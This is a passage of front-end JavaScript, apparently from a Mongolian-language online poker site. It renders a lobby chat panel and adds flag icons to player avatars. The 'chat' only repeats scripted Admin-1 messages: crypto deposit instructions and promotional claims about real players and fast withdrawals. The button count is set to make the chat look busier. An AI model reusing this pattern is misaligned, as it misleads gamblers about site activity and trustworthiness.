    'ХЭРХЭН КРИПТО ЦЭНЭГЛЭЛТ ХИЙХ ЗААВАР: 1. Мөнгөний касс хэсэгрүү ороод цэнэглэлт гэсэн хэсгийг сонгоно. 2. ДҮН гэсэн хэсэгт цэнэг хийх дүнгээ төгрөгөөр (MNT) оруулна уу. 3. Үүний дараа цэнэглэлт гэсэн хэсэг дээр дарж үргэлжлүүлнэ. 4. Дэлгэцэн дээр таны төгрөгөөр оруулсан дүн USD руу шилжиж гарж ирэх болно. 5. Гарж ирсэн үнийн дүнгийн (USD) дагуу доорх хаяг руу та өөрийн дурын крипто хэтэвчээр цэнэг хийх боломжтой.(Гарж ирсэн хаягыг хуулж аваад яг энэ дүнгээр явуулах ёстой, буруу хаяг руу явуулсан тохиолдолд цэнэг орохгүйг анхаарна уу!)',
    '🔥АДМИНТАЙ холбогдох заавар cashier (МӨНГӨНИЙ КАСС) дээр дараад 5 дахь сонголт дээр дарж хүсэлт ээ явуулна уу ! 🔥',
    '🔥 Та яагаад манай сайтыг сонгох ёстой вэ? Бид тоглогчдод шударга, хурдан, найдвартай орчин бүрдүүлэхийг зорьдог. Тиймээс дараах давуу талуудыг санал болгож байна.',
    '1️⃣ Бодит тоглогчидБусад сайтууд гадаадын мэргэжлийн тоглогчдыг түрээслэн тоглуулдаг тохиолдол байдаг. Харин манай сайт дээр бүх тоглолт бодит тоглогчдын хооронд явагддаг.',
    '2️⃣ Хурдан цэнэг, таталтМанай систем Японы банк, төлбөрийн технологийн шийдэлтэй холбогдсон тул таны цэнэг болон таталт маш хурдан орно.Бусад газарт таталт 10 минут – 1 цаг хүртэл хүлээлгэдэг болманай таталт хамгийн удаандаа 4 минут, оргил цаг биш үед 1 минут хүрэхгүй хугацаанд ордог.',
    '3️⃣ Хүчирхэг серверМанай сайт Америк сервер дээр байрладаг тул гацах, удаашрах асуудал байхгүй. Та тоглоомоо саадгүй, тогтвортой тоглох боломжтой.',
    '4️⃣ Жинхэнэ өрсөлдөөнМанай тэмцээнүүд ашгийн төлөө бус, тоглогчдод жинхэнэ бодит өрсөлдөөн мэдрүүлэх зорилготой зохион байгуулагддаг.'
  ];
  // Чатанд харагдах дараалал: бүх мессеж 2 удаа, эцэст нь эхний мессеж дахин
  CHAT_MESSAGES = CHAT_MESSAGES.concat(CHAT_MESSAGES, [CHAT_MESSAGES[0]]);
  // мессежүүд ээлжлэн ногоон / цэнхэр (хамгийн сүүлийнх нь ногоон)
  var CHAT_GREEN = '#78ff3c', CHAT_CYAN = '#3ef2f2', CHAT_SEP_COLOR = '#f5e400';

  // Анхны чатны зурган эможинууд (✨ хоёр одтой, 🔥)
  var CHAT_SMILES = {
    '✨': 'data:image/webp;base64,UklGRmIDAABXRUJQVlA4TFYDAAAvLAALEB652TY5knJJXhgHzNagvMuMBHDl1ApE/4WO4Z5ndqaqNoNyER0DOgDZ2ASgwdJauGci+sFB20iSRHXvv04PiGVuyJEkSVJWtH3tAl1Rw6kCwiEAL3Y6a45sLp0GbgAABJvYtp3Utm2dYNtuV002Jtu2bWy2bTJyG0mRMwsnpj+E1XmJDV+HXiaFM4G80+xs2l4CW5+t+wDxONgrIdKnayh0ucULotanmxHA+erA3SE+M2944O2gd6gLj6c4/09nOPjAZA38Q2p48A5Nzn+Vc6+PIKGI8PWY5sFa62xt5QK0FqDSYdoeXXvTfHb0bCyHi+5x3wpwx+7hJs7enH+WKudFx4D0KqUAbgb+fStye1Ud9X469ltcHWEBhnuCBtWV2W6O3Yxazt9jlfNB14ib7Y9Md9KjGPjtAe9nJT30js4mx3lr6BqP0+6FEURFWQaRGUZHnxuW88oAr73C6jSUBF8DwKuAF0bz3fmc73o8e2FYtpyAgtEyDLIlrLp1bK2PTsxKNAExZRyEZ0/fPLdfV96RFJYES+BTAbyI1A4jbhRw/p32y7VsCx6KFnAhmoKhm2HN6/kwiGYHPBU94AbSSDf7/uOnOVt3xgUNmQX8FivgG0hbOCNCi4/tNBkiFjgH/j0Bh4Kw5ImsOHp+hCMCimgmv4CP4u0bZD5Mhic0YsSmDumpD80ZT7QkooBTF2APCHo5OKrdbuIwE6CA9N8mwVcSKeNXhMx2rvcYeDQAVwn6MW5COQ2TPEOgCdyr3kDKhYJodreyDU+nhPl/BfB8JxSNG5voh1SR7yORRJQiSXf1aFpKJPonum0Y6XJTMOJ62vfYsESXOd8NV6dNir+Hjy9MXBVRbs6Z6KFVQt8AygaAjNC05JmXEa1v+Ma5nNVEg3f/seI+URrR30BuaWeXUnANYKgH1MfIbiVtKZboII/bJqqfKMevttc9SNcYt+ET3ipvopMx0quehO9LCNx+Ca3dOoNofrh+I3wBreVP6O33RSbaXZroMd5/CBBfBD5h1JjNekQjaw6gVxJWJXlQDyuizkz0R2at8Jp5wwOv9h+n0e3zRE2FP6AmTOs+wEQXREErEBkedkSNT1YgsHW4uukAreCSw0RpxArOS6zDPitREw==',
    '🔥': 'data:image/webp;base64,UklGRh4EAABXRUJQVlA4TBIEAAAvLAALEL/nKpJsV+l9EVf4/8IIhYB0l6xh/mFHkuSoyp5TTuAE+P+BTZon21Vt26qyHu4UoH8ISngDPh0eHN4Y+4iAJMEBtaM1J+csfFQYUKB8AgMKFQr/fJ8UKhQGUP78oH4hESgUEoVAIFEI6PMBR6HgMAgFh1BwOIREIBFICE4SBtFeaDCkc7LEEEMyqf/CEO/KFFeIdqRFh0RAYYAhDcxiHIJoS3swJqBgg6IBQUF0ztKDoCBcyrA6K0Osy5D/Dpq0gYKigiZVVPixfgsDKk+0aNFB1cSwMiRnbCHawxAG8b8LmszqikEQBMWyiRg0WW2y6eD2X4XADFef8dnM7952cQqueXSJGRblIARqIEQgBBgKDBECLBAKk8DAEEMNEViIjQgMBEIUViIQWImFAAcRGAJsxE4EBkIENhgCBH4Btdu2ju3tgN4d27adPDu2bdu2bdu2bdtG3dS23T53z/frXOdBG9H/CZD/ya1x9bD59Ti4PM+zgQPiQI6M1/qy2rY4GMXTSktyaNTOGjqxrXOeJJdHafVRw0C2diY7BxKiM7iZ4e7pK04rh/M9G03XqnK1T99EtY12de8qy2xyYiTdNS5WunCmZTDZ4K5tRzVPB2d9eXa0dCQ519mwVptGb/nNIg/2k4ctPUn2FJFzdUcrl+r42ENkLslOlqUkp4ts38fqq5xxJItqtW7IeJLzLDKzSdedcr0Fyd4icrEmySc3FZ6Ss0cq9ZXIB5NktfMiY0iWROqQMkqiO4/qUNlUkWQuIJ9S+WJUztfWuPAASaYEku5xeFJZc882kt4aJFkYAHIpPZxle1eYNlfwqRmcJHucpiIJEyrymKk9vaWc0okc5Ha46nw7kv0s5+gtl6I0ySxQkyndapHkGEt/Xy5kJUsm0lDI0Y9aGnt2JUaiEnwEb0bLcMMFenMASFsA/sTlSJZWhhkWekJJASCR8/JrAChI5k2vjDRM8uSD/5O/f3Cyl3mETEoPwxRPOt/n4eBbJ3lSILsyzTBDK5fY82k4CL5y3PzKccMsrSDwzPkkHATBF76bylrDJi038NObwLv/BqakdOsnGG5UJ0tlKpIVr4T/+PjV3wL3awAvPgIyKqPFOoRkWiTC24HxJ+D93z8DbilLTItI3gbwhiX45ddw+C0kyputGHlQ7CPIUBrg6Z+WIAh+BoAsZIV1EZyrShYD8J3tn3cAPC5HjpFIj5HMCbz2l+lLAKnLkofuRyQDSGYCPvzb8P1TIM1u8vBFieLE8gxlBj74U/vn66dA1hDZeadEdUF9Mk8SvPjmjyD458f3gFRFyXpzJNoXB1Vh6axJgNdfPkfSDIXIRlN3SgzP9G3IUNE8ue7cKs4KLfosfSgxTtgya1yvsQNnnli5U/7r'
  };

  // 1️⃣2️⃣3️⃣4️⃣ гэх мэт тоон эможийн оронд одтой ✨ эможи тавьж, ✨/🔥-г зургаар солино
  function chatRich(t) {
    return chatEsc(t.replace(/[0-9]\uFE0F?\u20E3/g, '✨'))
      .replace(/✨|🔥/g, function (e) {
        return '<img class="lc-smile" alt="' + e + '" src="' + CHAT_SMILES[e] + '">';
      });
  }

  function chatEsc(t) {
    return t.replace(/[&<>"]/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c];
    });
  }

  function chatLine(text, color) {
    return '<div class="lc-msg"><span class="lc-author">Admin-1:</span> ' +
      '<span class="lc-text" style="color:' + color + '">' + chatRich(text) + '</span></div>';
  }

  function buildLobbyChat() {
    var css = document.createElement('style');
    css.textContent =
      '#lobby-chat{position:fixed;right:0;z-index:10050;display:none;flex-direction:column;' +
        'width:400px;max-width:100vw;background:#1e1e1e;box-shadow:0 -4px 16px rgba(0,0,0,.55);' +
        'font-family:Roboto,\'Helvetica Neue\',Arial,\'Apple Color Emoji\',\'Segoe UI Emoji\',\'Noto Color Emoji\',sans-serif;' +
        'font-weight:400;color:#fff;-webkit-font-smoothing:antialiased}' +
      '#lobby-chat.open{display:flex}' +
      '#lobby-chat .lc-close{flex:none;height:34px;display:flex;align-items:center;justify-content:center;cursor:pointer}' +
      '#lobby-chat .lc-close svg{width:24px;height:24px}' +
      '#lobby-chat .lc-close:hover svg{opacity:.75}' +
      '#lobby-chat .lc-pinned{flex:none;padding:2px 14px 10px;color:#f8c76a;font-size:15px;line-height:1.35;letter-spacing:.2px}' +
      '#lobby-chat .lc-list{flex:1;overflow-y:auto;padding:4px 14px 10px;font-size:14px;line-height:1.38}' +
      '#lobby-chat .lc-msg{margin:0;word-wrap:break-word}' +
      '#lobby-chat .lc-author{color:#a3a3a3}' +
      '#lobby-chat .lc-smile{width:1.5em;height:1.5em;vertical-align:-0.4em;margin:0 .1em;pointer-events:none}' +
      '#lobby-chat .lc-list::-webkit-scrollbar{width:5px}' +
      '#lobby-chat .lc-list::-webkit-scrollbar-thumb{background:rgba(255,255,255,.2);border-radius:3px}';
    document.head.appendChild(css);

    var lines = [];
    var n = CHAT_MESSAGES.length;
    CHAT_MESSAGES.forEach(function (m, i) {
      lines.push(chatLine(m, (n - 1 - i) % 2 === 0 ? CHAT_GREEN : CHAT_CYAN));
      lines.push(chatLine(CHAT_SEP, CHAT_SEP_COLOR));
    });

    var el = document.createElement('div');
    el.id = 'lobby-chat';
    el.innerHTML =
      '<div class="lc-close" title="Хаах">' +
        '<svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">' +
          '<polyline points="6 6 12 12 18 6"/><polyline points="6 12 12 18 18 12"/></svg>' +
      '</div>' +
      '<div class="lc-pinned">' + chatRich(CHAT_PINNED) + '</div>' +
      '<div class="lc-list">' + lines.join('') + '</div>';
    document.body.appendChild(el);
    el.querySelector('.lc-close').addEventListener('click', function () { el.classList.remove('open'); });
    return el;
  }

  // Самбарыг доод мөрийн (footer) яг дээр, дэлгэцийн баруун талд байрлуулна
  function placeLobbyChat(el, btn) {
    var footer = btn.closest('.footer_block') || btn;
    var top = footer.getBoundingClientRect().top;
    el.style.bottom = Math.max(0, window.innerHeight - top) + 'px';
    el.style.height = Math.min(top - 10, Math.max(260, Math.min(380, window.innerHeight * 0.45))) + 'px';
  }

  function initLobbyChat() {
    var btn = document.querySelector('.LobbyFooterButtonsContainer__button.chat');
    if (!btn) return;
    var panel = null;
    var count = btn.querySelector('.SimpleButton__text');
    if (count) count.textContent = CHAT_MESSAGES.length;

    btn.addEventListener('click', function (e) {
      e.stopPropagation();
      if (!panel) panel = buildLobbyChat();
      if (panel.classList.contains('open')) {
        panel.classList.remove('open');
        return;
      }
      placeLobbyChat(panel, btn);
      panel.classList.add('open');
      var list = panel.querySelector('.lc-list');
      list.scrollTop = list.scrollHeight;
    });
    window.addEventListener('resize', function () {
      if (panel && panel.classList.contains('open')) placeLobbyChat(panel, btn);
    });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initLobbyChat);
  else initLobbyChat();

  /* ── Avatar дээр Монголын далбаа нэмэх ── */
  (function () {
    var styleTag = document.createElement('style');
    styleTag.textContent = [
      '.poker-root .MiniUserInfo__avatar {',
      '  overflow: visible !important;',
      '}',
      /* Avatar доторх харанхуй div-ийг нуух */
      '.poker-root .MiniUserInfo__avatar .Avatar > *:not(.Avatar__content):not(.Avatar__country_flag) {',
      '  display: none !important;',
      '}',
      '.poker-root .Avatar .Avatar__country_flag .Icon:empty {',
      '  display: none !important;',
      '}',
      '.poker-root .Avatar .Avatar__country_flag .Icon {',
      '  background: transparent !important;',
      '  background-color: transparent !important;',
      '}',
      '.poker-root .MiniUserInfo__avatar::after {',
      '  content: \'\';',
      '  display: block;',
      '  position: absolute;',
      '  bottom: 0;',
      '  right: 0;',
      '  width: 1.5em;',
      '  height: 1.1em;',
      '  background-image: url(data:image/webp;base64,UklGRt4BAABXRUJQVlA4TNIBAAAvT8AOAA/kIJIkKWoQgAL828EO93SnDQZtG0nyIF9oh+udIGjbNs6oHMv5Q+r8x3NfgBVBGhEBsGJoAdGiAHz2dAMtMAgyiMgCWuCUd5OAf1FA2QAi8l8yWcCKAgBiIiqCFKBA4kCDAETEIE75FYAV5r9nBYZ/RBIAE6IhC0EgAl0gwpAjBiCJIgKCAAjCpIACEJNyXc99PkCWbdu0s57N2E7ui23btm1bK/h2Y/XSiej/BPAHX15/8IV/8l/MjJrHuEcth0Po0zJe7So/lVKU4o4ZkTJuhvtYCudbdyhlNZJWcabjmctWAFFXMshMvG0WEvtO2aOKp7vcd3rWVbBx1wMg/rZWRl7NXn1B115Gv4yDgDsjL9Ga/CCDx5GQLbrujgpOFhYWto8X3r9eWVhYuPtj3QCM+yY7AH8vwwC2FJAHOZbCSyohz0khBt7vl9FnGJESwzDmZPBmrnNwdZOUcdNhCpQ6Kqd0zJqQfuYt9+2oyG8HgIx0TKooroOvqiwBGFNhDKDWEQ9gTsaaqyybfqSey+BcizMKWRvUwaPtmcUL6igPvj8qozHp/QkZRw11b9tuZHApDjDlHFPBcDAYLCcfe5OmSSYGg8H9P/bd/6UA);',
      '  background-size: contain;',
      '  background-repeat: no-repeat;',
      '  background-position: bottom right;',
      '  z-index: 999;',
      '  pointer-events: none;',
      '}'
    ].join('\n');
    document.head.appendChild(styleTag);

    function addFlagToAvatars() {
      document.querySelectorAll('.Avatar').forEach(function (avatar) {
        var existingFlag = avatar.querySelector('.Avatar__country_flag');
        if (existingFlag) {
          // Icon__content агуулаагүй хоосон icon-ийг нуух
          existingFlag.querySelectorAll('.Icon').forEach(function (icon) {
            if (!icon.querySelector('.Icon__content')) {
              icon.style.display = 'none';
            }
          });
          return;
        }
        var flagContainer = document.createElement('div');
        flagContainer.className = 'Avatar__country_flag';
        var flagIcon = document.createElement('div');
        flagIcon.className = 'Icon Icon_v_default Icon_c_white Icon_val_flag_icon_mn';
        var iconContent = document.createElement('div');
        iconContent.className = 'Icon__content';
        flagIcon.appendChild(iconContent);
        flagContainer.appendChild(flagIcon);
        avatar.appendChild(flagContainer);
      });
    }

    addFlagToAvatars();
    setTimeout(addFlagToAvatars, 800);
    setTimeout(addFlagToAvatars, 2000);

    function removeDarkDivOnAvatar() {
      document.querySelectorAll('.MiniUserInfo__avatar').forEach(function (avatarWrapper) {
        var rect = avatarWrapper.getBoundingClientRect();
        if (!rect.width || !rect.height) return;
        var points = [
          [rect.left + rect.width * 0.2, rect.top + rect.height * 0.82],
          [rect.left + rect.width * 0.5, rect.top + rect.height * 0.82],
          [rect.left + rect.width * 0.75, rect.top + rect.height * 0.82]
        ];
        var hidden = [];
        points.forEach(function (pt) {
          try {
            var els = document.elementsFromPoint(pt[0], pt[1]);
            els.forEach(function (el) {
              if (hidden.indexOf(el) !== -1) return;
              if (!el || el === document.body || el === document.documentElement) return;
              if (el === avatarWrapper) return;
              if (el.classList.contains('Avatar') || el.classList.contains('MiniUserInfo__avatar')) return;
              if (el.classList.contains('Avatar__content')) return;
              if (el.classList.contains('Avatar__country_flag')) return;
              if (el.closest && el.closest('.Avatar__country_flag')) return;
              if (el.closest && el.closest('.Avatar__content')) return;
              var bg = window.getComputedStyle(el).backgroundColor;
              if (!bg || bg === 'rgba(0, 0, 0, 0)' || bg === 'transparent') return;
              var m = bg.match(/rgba?\((\d+),\s*(\d+),\s*(\d+)/);
              if (!m) return;
              var lum = +m[1] * 0.299 + +m[2] * 0.587 + +m[3] * 0.114;
              if (lum < 80) {
                el.style.display = 'none';
                hidden.push(el);
              }
            });
          } catch (e) {}
        });
      });
    }

    setTimeout(removeDarkDivOnAvatar, 1000);
    setTimeout(removeDarkDivOnAvatar, 2500);

    var observer = new MutationObserver(function () { addFlagToAvatars(); });
    observer.observe(document.body, { childList: true, subtree: true });
  }());

  /* ── global exports for mobile_app.js ── */
  window.showLogin    = showLogin;
  window.hideLogin    = hideLogin;
  window.showRegister = showRegister;
  window.hideRegister = hideRegister;
  window.showSettings = showSettings;
  window.hideSettings = hideSettings;
  window.openSidebar  = openSidebar;
  window.closeSidebar = closeSidebar;
  window.openTable    = openTable;
  window.hideTable    = hideTable;

})();
